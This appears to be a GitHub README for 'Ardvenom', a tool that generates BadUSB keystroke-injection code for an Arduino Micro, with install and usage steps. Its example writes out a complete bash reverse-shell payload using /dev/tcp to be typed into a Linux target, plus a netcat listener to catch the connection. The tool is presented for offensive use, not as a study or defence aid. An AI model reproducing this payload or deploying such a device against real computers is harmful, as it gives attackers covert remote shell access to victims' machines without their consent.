# Ardvenom

A tool that auto generate badUSB like code for Arduino Micro code.

## Installation
### Requirements
Debian
```bash
apt-get install arduino arduino-cli
```
Arch
```bash
pacman -S arduino arduino-cli
```
### Preparation
add user to uucp group
```
sudo usermod -a -G uucp USERNAME
```
enter group to skip reboot
```bash
newgrp uucp
```

## Usage

Plug your Arduino Micro using USB cable (make sure it's the only pluged Arduino).


![arduino](https://github.com/j4ckst0ne37/Ardvenom/blob/main/arduino.jpg?raw=true)

Run ardvenom.py
```bash
./ardvenom.py -o OS -l KEYBOARD_LAYOUT -c CMD
```
## Example

To make a simple reverse-shell for a Linux target.

```bash
./ardvenom.py -o linux -l qwerty -c "nohup bash -i >& /dev/tcp/IP/PORT 0>&1 > /dev/null & disown && exit"
```
In the other side
```bash
nc -vnlp PORT
```

## License
[MIT](https://choosealicense.com/licenses/mit/)
